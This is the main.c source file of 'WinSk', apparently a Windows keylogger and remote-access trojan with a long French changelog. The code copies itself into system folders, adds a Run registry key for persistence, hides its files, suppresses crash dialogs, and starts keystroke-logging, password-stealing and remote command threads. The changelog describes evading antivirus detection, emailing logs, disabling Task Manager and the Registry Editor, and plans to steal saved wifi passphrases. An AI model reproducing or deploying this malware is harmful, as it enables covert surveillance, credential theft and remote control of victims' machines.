//=============================================================================
// Projet : WinSk
// version : 7.2
// Auteur : AXeL
// Fichier : main.c
// Date de cr�ation : 18/10/2013 (v 2.0)
// Date de la derni�re modification : 04/11/2018
// Lacunes : - (r�solu) Si le fichier de configuration �xiste d�j�, le nom du programme
//             peut �tre diff�rent de celui dans la variable Parametres.NomProcessus
// Id�es d'am�lioration : - Envoyer une capture d'�cran avec chaque log
//                        - D�tecter les passphrases wifi enregistr� sur l'ordi. et les envoyer
//                        - (r�solu) Cryptage des logs lors de l'envoie (algo. vigenere)
//                          => ajouter un programme de d�cryptage/sauvegarde des logs
//                        - (r�solu) Modifier l'emplacement du fichier de configuration si
//                          DeepFreez ou autre d�tect�
// Modifications r�centes : - 27/12/2013: (v 3.0)
//                             - Optimisation de l'espion au niveau de l'usage CPU
//                             - Capture&Correction de nouvelles touches dans l'espion
//                             - Suppression des bouts du code qui ont �t� d�tect�s
//                               par antivirus
//                             - Le nombre de thread utilis� descend � 1 seul thread
//                          - 29/12/2013: (v 3.1)
//                             - Changement du sujet du log dans EnvoyerLog()
//                          - 03/01/2013: (v 4.0)
//                             - Ajout du thread PopConnexion pour g�rer le programme 
//                               � distance
//                             - Lancer/arr�ter les threads � distance
//                             - Ajout d'une fonction de sauvegarde des param�tres
//                             - Mise � jour invisible si nom du mutex diff�rent de celui
//                               de la version courante
//                          - 04/01/2014:
//                             - R�vision/optimisation de la lisibilit� de la fonction main
//                             - Ajout de FILES_PATH dans 'resources.h' qui permettra
//                               de changer l'emplacement des fichiers log et configuration
//                             - Ajout de la fonction cacherFichier()
//                          - 06/01/2014:
//                             - R�glage d'un beug au niveau de la fonction nbrLignesFichier()
//                          - 18/01/2014:
//                             - !BETA! : Modification du thread PopConnexion (changement du
//                               serveur pop exactement)
//                             - Ajout de la fonction enleverCaracteres()
//                             - Ajout d'une constante pour activer/d�sactiver la version
//                               test + ajout des fonctionnalit�s de cette version :
//                                  - Stockage des fichiers(Log, Config.) sur le disque local D:
//                                  - On cache ces fichiers aussi
//                                  - Le nom du processus du programme change
//                                  - Le thread Espion est d�sactiv� dans cette version
//                          - 19/01/2014:
//                             - Mineurs modifications dans le thread Espion (ajustement du
//                               traitement de l'historique des touches CTRL/ALT et SHIFT)
//                          - 23/01/2014:
//                             - Ajout de la fonction recupererIp()
//                          - 24/01/2014:
//                             - Modification du chemin de copie de l'�x� dans la fonction
//                               main (DEFAULT_PATH)
//                             - Modification de la gestion des erreurs d'infiltration dans
//                               la fct. main
//                          - 08/02/2014: (v 4.1)
//                             - Ajout d'un 3�me param�tre => StopSender
//                             - Quelques modifications sur les chemins d'acc�s
//                               en test version
//                          - 25/09/2015: (v 5.1)
//                             - Ajout de sendMail.c qui contient la fonction sendMail()
//                               qui permet l'envoie de mail via GMAIL avec SSL.
//                             - Modification du thread d'envoie de mail, EnvoyerLog().
//                             - Dor�navant, On arr�te le processus d'une ancienne version avant de l'�craser.
//                             - D�sactivation du thread PopConnexion()
//                             - Le nombre de thread passe � 1
//                          - 29/09/2015 - 30/09/2015: (v 6.0)
//                             - Ajout du thread ClientSocket
//                             - Le nombre de thread passe � 2
//                             - Suppression des bouts de code non n�cessaire/anciens
//                             - Changement de l'icone du programme (en icone d'image).
//                          - 01/10/2015:
//                             - Modification des param�tres (suppression de ceux non n�c�ssaires).
//                             - Ajout de la fonction checkParametres() pour v�rifier les param�tres.
//                             - Modification de la fonction main(), plus pr�cisament de la gestion
//                               de Mise � jour et d'anciennes versions et du lancement des threads.
//                             - Ajout du thread EspionMdp().
//                          - 02/10/2015:
//                             - Correction des fuites de m�moire des fonctions qui renvoient un pointeur.
//                             - Am�lioration des fonctions d'envoie/r�ception de fichiers
//                               (la taille du fichier est envoy�e en premier maintenant +
//                               ajout d'une synchronisation entre client et serveur avant d'envoyer ou recevoir un fichier).
//                             - Organisation des commandes serveur + suppression/modification de quelque une.
//                             - Ajout de crypt.c, donc du cryptage/d�cryptage du text entre client/serveur
//                               (commande et/ou reponse, tandis que les fichiers sont envoy�/re�u en clair).
//                             - Correction de plusieurs probl�mes au niveau des commandes.
//                             - Optimisation + Test du thread EspionMdp().
//                             - Correction du code de la Commande Explore_Directory.
//                             - Ajout de la constante/directive pr�processeur CRYPT_DECRYPT, du c�t� du
//                               client et du serveur, qui permet d'activer ou d�sactiver le cryptage.
//                          - 03/10/2015: (v 6.1)
//                             - Ajout de la commande Explore_Drives qui retourne les partitions courantes.
//                             - Plusieurs modifications au niveaux des commandes/fonctions pour s'addapter au serveur.
//                             - Maintenant si la taille du fichier � envoyer == 0 on annule l'envoie.
//                          - 04/10/2015:
//                             - D�sactivation des messages d'erreur en cas de crash.
//                             - Refonte/Correction de la commande File_Opr.
//                             - Am�lioration de la fonction cacherFichier().
//                             - Ajout de la fonction afficherFichier().
//                             - Ajout du define HIDE_FILES qui permet de cacher l'ex� et les fichiers de config et log..
//                             - Ajout de la fonction ecraserFichier().
//                             - Ajout de l'�crasement de l'ancienne version et son fichier config dans le main().
//                          - 05/10/2015:
//                             - Correction/Am�lioration des commandes.
//                          - 06/10/2015:
//                             - Il n'est plus possible de combiner des commandes (car cela pourrais provoquer un probl�me).
//                             - Ajout de la commande Update_Config.
//                          - 07/10/2015:
//                             - Maintenant le thread Client s'occupe d'enregistrer la date d'aujourd'hui et l'heure du lancement,
//                               par contre s'il est d�sactiv�/arr�t� le thread Espion ou EspionMdp le fera � sa place.
//                          - 09/10/2015:
//                             - Modification des commandes de clic sourie.
//                          - 10/10/2015:
//                             - R�ecriture de la fonction tailleFichier() en API car elle renvoyait
//                               une taille + grande que la v�ritable taille du fichier.
//                          - 21/10/2015:
//                             - Utilisation du mot de passe par d�faut dans crypt.c � cause des erreurs de d�cryptage.
//                          - 22/10/2015:
//                             - Passage � la m�thode de cryptage/d�cryptage xor(), pour �viter les erreurs lors du changement
//                               du mot de passe de la m�thode Crypt().
//                             - Suppression des commandes : Hide_As_System_File et Show_File.
//                             - Ajout des commandes/Remplacement par : Get_F_Info et Set_F_Info.
//                          - 27/10/2015: (v 6.2)
//                             - Mise � jour/Correction de la commande Reg_Set.
//                          - 28/10/2015:
//                             - Correction de la commande Set_Volume, ainsi qu'une petite correction au niveau de la fonction
//                               ajouterModifierRegistre().
//                          - 21/01/2017: (v 7.0)
//                             - Gestion des param�tres pass�s en ligne de commande.
//                          - 31/03/2017:
//                             - Quelques corrections/r�ctifications mineurs des nouveaut�s de la v7.0
//                             + ToDo : Connexion IMAP/POP3 � l'adresse email et v�rifier s'il y'a des messages re�u contenant des
//                               commandes au cas ou le serveur est hors-ligne (ou meme lancer un exe qui s'occupera de faire �a).
//                          - 04/04/2017:
//                             - Ajout d'une interface graphique simple pour le client aussi (en version de test uniquement)
//                               activable/d�sactivable � travers la constante NO_GUI.
//                             + ToDo : Code du boutton Send/Envoyer (mais il faudra faire attention, quand on re�oit un fichier
//                               du serveur par exemple etc..)
//                             - J'ai comment� le code du thread EnvoyerLog car �a ne fonctionne plus (m�me avec SSL).
//                          - 11/07/2017:
//                             - Ajout de la possibilit� de se connecter � plusieurs serveur (un � la fois) au lieu d'un seul auparavant.
//                             - R�duction du temps d'attente avant reconnexion + d�finition d'une constante pour cela.
//                          - 12/07/2017: (v 7.1)
//                             - Impl�mentation du code du boutton Envoyer et ajout des fonctions lockGUI et unlockGUI.
//                             - Ajout d'un nouveau thread 'ToDoThread' qui s'occupe d'ex�cuter des commandes � retardement.
//                             - Ajout des commandes Add_ToDo/Delete_ToDo/List_ToDo qui permettent d'ajouter/supprimer/lister les ToDo.
//                          - 13/07/2017:
//                             - Ajout du fichier 'todo.c' qui contient toutes les fonctions de la liste chain�e 'ToDoList'.
//                             - Ajout de la commande Free_ToDo qui permet de vider la ToDoList.
//                             - Ajout de la fonction ToAlwaysDo() qui permet d'effectuer des actions � chaque d�marrage.
//                             - La constante TEST_VERSION peut prendre 3 valeurs maintenant, soit 0, 1 ou 2.
//                             - Ajout de la commande Set_Task_Manager qui permet d'activer ou de d�sactiver le Gestionnaire des t�ches.
//                          - 14/07/2017:
//                             - Correction d'une petite erreur concernant la variable tailleF sur la fonction checkParametres().
//                             - Correction du comportement lors de la d�tection d'une ancienne version en mode NO_INFILTRATION.
//                             - Ajout de la v�rification des param�tres pour les commandes Add_ToDo et Delete_ToDo.
//                          - 16/07/2017: (v 7.2)
//                             - Ajout de la constante ENABLE_MULTI_INSTANCE et de la variable ALLOW_MULTI_INSTANCE.
//                             - Ajout du param�tre en ligne de commande --allow-multi-instance.
//                             - Ajout de la constante DISABLE_TASK_MANAGER.
//                          - 17/07/2017:
//                             - Ajout des fonctions is_file() et is_dir().
//                             - La fonction exploreDirectory() renvoie maintenant une valeur bool�ene de plus pour indiquer 
//                               si chaque fichier/dossier est un dossier ou non (0|1).
//                          - 20/07/2017:
//                             - Ajout de la constante DISABLE_REGISTRY_EDITOR.
//                             - Ajout de la commande Set_Registry_Editor.
//                          - 04/11/2018:
//                             - Ajout de la commande Get_Elapsed_Time.
//
//
// - Lacunes/Travail � faire :
//             - Le double clic ne fonctionne pas apr�s l'avoir test�, pour une raison ou une autre
//               que je connais pas, si jamais quelqu'un a une solution, vous me le dites.
//             - Relire et corriger les commandes serveurs (par exemple corriger la non
//               gestion des espaces dans un path pour certaines commandes).
//             - (r�solu) Refaire/Recoder les fonctions d'�criture/lecture des fichiers en Windows API.
//             - (r�solu) Parfois, je dit bien parfois l'envoie/r�ception de fichiers bloque, je pense
//               � y remedier en utilisant des threads pour l'envoie/r�c�ption, mais �a reste
//               � revoir comme m�me.
//
//=============================================================================

#include "resources.h"


//=============================================================================
//                            Fonction principale
//=============================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrecedente, LPSTR lpCmdLine, int nCmdShow)
{
   // Gestion des param�tres pass�s en ligne de commande
   char * pch;
   pch = strtok (lpCmdLine, " ");
   
   DO_INFILTRATION = ! NO_INFILTRATION; // Pour activer/d�sactiver l'infiltration
   ALLOW_MULTI_INSTANCE = ENABLE_MULTI_INSTANCE;
   
   while (pch != NULL)
   {
      if (! strcmp(pch, "--version"))
      {
         #if NO_GUI == TRUE
            printf("%s\n", NOM_MUTEX);
         #else
            MessageBox(NULL, NOM_MUTEX, "Version", MB_OK | MB_ICONINFORMATION);
         #endif
         return 0;
      }
      else if (! strcmp(pch, "--no-infiltration"))
      {
         DO_INFILTRATION = FALSE;
      }
      else if (! strcmp(pch, "--allow-multi-instance"))
      {
         ALLOW_MULTI_INSTANCE = TRUE;
      }
      
      pch = strtok (NULL, " ");
   }
   
   free(pch);
   
   // Cr�ation de l'interface graphique
   if (! NO_GUI)
   {
      HINSTANCE hInstRich32;
      MSG msg;
      WNDCLASS wc = { 0 };
   
      InitCommonControls(); /* Initialisation des contr�les communs */
    
      hInstRich32 = LoadLibrary("RICHED32.DLL"); /* Chargement de la DLL pour les Rich Edit */
   
      if(!hInstRich32)
      {
         MessageBox(NULL, "Impossible de charger RICHEDIT32.DLL !", NOM_MUTEX, MB_OK | MB_ICONWARNING);
         return 0;	
      }
   
      hInst = hInstance;
   
      wc.lpfnWndProc = MainWndProc;
      wc.hInstance = hInstance; 
      wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICONE)); 
      wc.hCursor = LoadCursor(NULL, IDC_ARROW); 
      wc.hbrBackground = NULL; 
      wc.lpszMenuName =  NULL; 
      wc.lpszClassName = "MainWinClass"; 
      wc.hbrBackground = (HBRUSH) (COLOR_BTNFACE + 1); /* Use Windows's default color as the background of the window */
 
      if(!RegisterClass(&wc)) return FALSE; 
 
      /* Cr�ation de la fenetre principale */
      hwFenetre = CreateWindowEx(WS_EX_TOPMOST, wc.lpszClassName, NOM_MUTEX,
                                 WS_POPUPWINDOW | WS_CAPTION | WS_OVERLAPPED | WS_MINIMIZEBOX,
                                 PX_ECRAN, PY_ECRAN, L_FENETRE, H_FENETRE, NULL, NULL, hInstance, NULL);
   
      if (!hwFenetre)  return FALSE;
 
      /* Affichage de la fen�tre */
      ShowWindow(hwFenetre, SW_SHOW);
      
      /* Gestion des messages/notifications */
      while (GetMessage(&msg, NULL, 0, 0)) 
      { 
          TranslateMessage(&msg);
          DispatchMessage(&msg);
      }
      
      /* Lib�ration de la DLL pour les Rich Edit */
      if(!FreeLibrary (hInstRich32))
	      MessageBox(NULL, "Biblioth�que RICHEDIT non lib�r�e !", NOM_MUTEX, MB_OK | MB_ICONWARNING);
    
      return msg.wParam;
   } // fin if (! NO_GUI)
   else
   {
      /* On d�sactive tout les messages d'erreur en cas de crash quand l'interface graphique est d�sactiv�e */
      SEM fSetErrorMode;
      HMODULE kernel32_dll = GetModuleHandle("kernel32.dll"); // dynamically load kernel32.dll
      if (kernel32_dll) {
         fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");

         if (fSetErrorMode)
            fSetErrorMode(SEM_NOGPFAULTERRORBOX); // hide system messages if program crashes
      }
      
      /* Lancement des Threads */
      lancerThreads();
   
   } // fin else > if (! NO_GUI)
   
return 0;
}

//=============================================================================
//              Fonction de v�rification de lancement des Threads
//=============================================================================

int lancerThreads()
{
   /* V�rification de l'�xistence du fichier de configuration */
   if (! NO_GUI) appendToRichConsole("CHECKING CONFIG. FILE...", "");
   
   if (lireFichier(FILES_PATH, NOM_CONFIG_FILE, "", 0))
   {
      if (! NO_GUI) appendToRichConsole("CONFIG. FILE", "OK");
      /* V�rification de l'�xistence du fichier de reset */
      if (lireFichier(FILES_PATH, NOM_RESET_FILE, "", 0))
      {
         if (! NO_GUI)
         {
            appendToRichConsole("RESET FILE", "DETECTED");
            MessageBox(NULL, "RESET FILE DETECTED", NOM_MUTEX, MB_OK | MB_ICONINFORMATION); // sans ce message, la fen�tre GUI ne s'affiche pas (pq? j'en sais rien..)
         }
         Sleep(5000); /* Pour attendre la fermeture du programme au cas ou */
         /* Suppression du fichier reset (on n'en a plus besoin) */
         char pathResetFile[200];           
         sprintf(pathResetFile, "%s\\%s", FILES_PATH, NOM_RESET_FILE);
         /* Si jamais le fichier est cach�/system ou en lecture seule */
         SetFileAttributes(pathResetFile, FILE_ATTRIBUTE_NORMAL);
         DeleteFile(pathResetFile);
      }
      
      /* v�rification des param�tres */
      if (checkParametres(FILES_PATH, NOM_CONFIG_FILE))
         chargerParametres(TRUE, FILES_PATH, NOM_CONFIG_FILE);
      else /* C'est surement une ancienne version */
         lstrcpy(Parametres.Version, "OLD_VERSION"); /* juste question que la chaine ne reste pas vide */
      
      /* Si ancienne version */
      if (lstrcmp(Parametres.Version, NOM_MUTEX))
      {
         if (! NO_GUI) appendToRichConsole("OLD VERSION", "DETECTED");
         // si on est en mode infiltration (NO_INFILTRATION == FALSE)
         if (DO_INFILTRATION) // if (! NO_INFILTRATION)
         {
            /* 1 - On arr�te l'ancienne version (si jamais elle est toujours ouverte, si nn arreterProgramme() va retourner un FALSE) */
            arreterProgramme(NOM_PROCESSUS);
            Sleep(3000); // On attend 3 seconde que �a se ferme
            /* 2 - On supprime l'ancienne version (si jamais elle est cach�/sytem) */
            if (ecraserFichier(SYSTEM_PATH, NOM_PROCESSUS) != 0) // si erreur d'�crasement
            {
               if (ecraserFichier(DEFAULT_PATH, NOM_PROCESSUS) == 0) // on utilise l'autre path/chemin
                  ecraserFichier(DEFAULT_PATH, NOM_CONFIG_FILE); // on �crase son fichier de configuration aussi
            }
            else
               ecraserFichier(SYSTEM_PATH, NOM_CONFIG_FILE); // on �crase le fichier de configuration aussi
         }
         /* 3 - Nouvelle infiltration */
         goto Infiltration_automatique;
      }
      else // si nn (ce n'est pas une ancienne version)
      {
         if (! NO_GUI) appendToRichConsole("CHECKING MUTEX...", "");
         HANDLE hMutex;
         hMutex = CreateMutex (NULL, FALSE, NOM_MUTEX); /* Instance */
         if (GetLastError() == ERROR_ALREADY_EXISTS) /* Si double instance */
         {
            if (! NO_GUI)
            {
               appendToRichConsole("DOUBLE INSTANCE", "DETECTED");
               if (! ALLOW_MULTI_INSTANCE)
               {
                  appendToRichConsole("MUTEX CHECK", "KO");
                  appendToRichConsole("PLEASE CLOSE THIS WINDOW", "WARNING");
               }
            }
            if (! ALLOW_MULTI_INSTANCE) return 0; // arr�t 
         }
         else if (! NO_GUI)
            appendToRichConsole("MUTEX CHECK", "OK");
      }
   }
   else /* Infiltration automatique en mode invisible */
   {
      if (! NO_GUI) appendToRichConsole("CONFIG. FILE", "KO");
      
      Infiltration_automatique: /* Block de code d'infiltration automatique (�tiquette xD) */
      
      chargerParametres(FALSE, "", ""); /* Chargement des param�tres par d�faut */
      
      if (DO_INFILTRATION)
      {
         if (! NO_GUI) appendToRichConsole("INFILTRATION...", "");
         BOOL copieSuccess = FALSE;
         char lpNomExe[MAX_PATH];
      
      /* Etape 1 : Copie/infiltration au syst�me */
   
         /* 1�re m�thode de copie (SYSTEM_PATH) */
         char *nomProgram;
         sprintf(Parametres.RepertoireInfiltration, "%s", SYSTEM_PATH);
         sprintf(lpNomExe, "%s\\%s", SYSTEM_PATH, Parametres.NomProcessus);
         nomProgram = recupNomDuProgramme(1);
         copieSuccess = CopyFile(nomProgram, lpNomExe, FALSE);
         
         if (! NO_GUI) appendToRichConsole("COPY TO SYSTEM_PATH", copieSuccess ? "OK" : "KO");
         
         if (!copieSuccess) /* Si �chec de copie (99% � cause du mode administrateur) */
         {
            /* 2�me m�thode de copie (DEFAULT_PATH) */
            CreateDirectory(DEFAULT_DIRECTORY, NULL); /* On cr�e alors un nv dossier (dans la racine) */
            CreateDirectory(DEFAULT_PATH, NULL); /* On cr�e un sous dossier (qui va contenir l'�x�) */
            sprintf(Parametres.RepertoireInfiltration, "%s", DEFAULT_PATH);
            sprintf(lpNomExe, "%s\\%s", DEFAULT_PATH, Parametres.NomProcessus);
            copieSuccess = CopyFile(nomProgram, lpNomExe, FALSE);
            
            if (! NO_GUI) appendToRichConsole("COPY TO DEFAULT_PATH", copieSuccess ? "OK" : "KO");
         }
      
         free(nomProgram); // car nomProgram est utilis� dans les 2 m�thodes de copie
      
         if (copieSuccess) /* Si copie r�ussie, j'ai pas mis d'else if i�i pour tenter les 2 m�thodes de copie */
         {
      
      /* Etape 2 : On assure le lancement aux prochains d�marrages */
      
            char nomClef[64];
            lstrcpy(nomClef, Parametres.NomProcessus); // copie dans nomClef (nomClef = Parametres.NomProcessus)
            /* Extraction du nom de la clef registre depuis le nom du processus */
            extractProcessusNameFrom(nomClef);
         
            /* Lancement au d�marrage (cr�ation d'une clef registre) */
            DWORD dwDisposition;
            HKEY hkSub = NULL;
            LPCTSTR sk = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            LONG openRes = RegCreateKeyEx(HKEY_CURRENT_USER, sk, 0 , NULL, 0, KEY_READ | KEY_WRITE, NULL, &hkSub, &dwDisposition);
            LPCTSTR name = nomClef;
            LPCTSTR data = lpNomExe;
            LONG setRes = RegSetValueEx (hkSub, name, 0, REG_SZ, (LPBYTE)data, strlen(data)+1);
            if (setRes != ERROR_SUCCESS) Parametres.LancementAuDemarrage = FALSE; /* Si �chec */
            
            if (! NO_GUI) appendToRichConsole("RUN ON BOOT", setRes == ERROR_SUCCESS ? "OK" : "KO");
   
      /* Etape 3 : Sauvegarde des param�tres */
   
            if (! NO_GUI) appendToRichConsole("SAVING SETTINGS...", "");
            sauvegarderParametres();
         }
         else
         {
            if (! NO_GUI) appendToRichConsole("INFILTRATION", "KO");
            return 0; /* �chec et mat !><! (Sortie du programme) */
         }
         
         if (! NO_GUI) appendToRichConsole("INFILTRATION", "OK");
         
      /* Etape 4 : Reboot programme (Si copieSuccess == TRUE on arrivera i�i) */
   
         if (! NO_GUI) appendToRichConsole("REBOOTING...", "");
         ShellExecute(NULL, "open", lpNomExe, NULL, NULL, SW_HIDE); /* Relancement du programme */
      
         // On cache l'ex� (il faut le mettre apr�s le lancement, si nn �a ne marche pas)
         if (HIDE_FILES)
         {
            appendToRichConsole("HIDING FILES...", "");
            cacherFichier(lpNomExe, "", TRUE, FALSE);
         }
         
         return 0;
      } // fin if (DO_INFILTRATION)
      else
      {
         if (! NO_GUI) appendToRichConsole("SAVING SETTINGS...", "");
         sauvegarderParametres();
      }
   }
   
   /* "Well done !" Au travail */
   if (! NO_GUI)
   {
      appendToRichConsole("STARTING THREADS...", "");
      appendToRichConsole("-------------------", "");
      appendToRichConsole("Espion Thread", Parametres.StopEspion ? "KO" : "OK");
      appendToRichConsole("EspionMdp Thread", Parametres.StopEspionMdp ? "KO" : "OK");
      appendToRichConsole("ClientSocket Thread", Parametres.StopClientThread ? "KO" : "OK");
      appendToRichConsole("EnvoyerLog Thread", Parametres.StopSender ? "KO" : "OK");
      appendToRichConsole("ToDo Thread", Parametres.StopClientThread ? "KO" : "OK");
      appendToRichConsole("-------------------", "");
   }
   
   /* Save startup time */
   startupTime = GetTickCount();
   
   /* Initialisation de la section critique */
   DWORD dwThreadId[NOMBRE_THREADS];
   DWORD dwThreadParam = 1;
   /* Cr�ation/Lancement des Threads (pas la peine de mettre un thread en commentaire, pour le d�sactiver, go ==> 'Ressources.h') */
   hThread[0] = CreateThread(NULL, 0, Espion, &dwThreadParam, 0, &dwThreadId[0]);
   hThread[1] = CreateThread(NULL, 0, EspionMdp, &dwThreadParam, 0, &dwThreadId[1]);
   hThread[2] = CreateThread(NULL, 0, ToDoThread, &dwThreadParam, 0, &dwThreadId[2]);
   
   if (NO_GUI)
   {
      //hThread[3] = CreateThread(NULL, 0, EnvoyerLog, &dwThreadParam, 0, &dwThreadId[3]);
      ClientSocket(0); /* Appel au ClientSocket (cm un appel de fct), car c'est le thread perssistant en TEST_VERSION et en version normale */
      /* Attente de la fin d'�xecution des Threads (!@! si espion arr�t�) */
      WaitForMultipleObjects(NOMBRE_THREADS, hThread, TRUE, INFINITE);
      /* Destruction des Threads et de la section critique */
      CloseHandle(hThread[0]);
      CloseHandle(hThread[1]);
      CloseHandle(hThread[2]);
      //CloseHandle(hThread[3]);
   }
   else
   {
      hThread[3] = CreateThread(NULL, 0, ClientSocket, &dwThreadParam, 0, &dwThreadId[3]);
      //hThread[4] = CreateThread(NULL, 0, EnvoyerLog, &dwThreadParam, 0, &dwThreadId[4]);
      /* la fermeture des threads se fait dans l'evenement WM_DESTROY de la gui (voir gui.c) */
   }
}
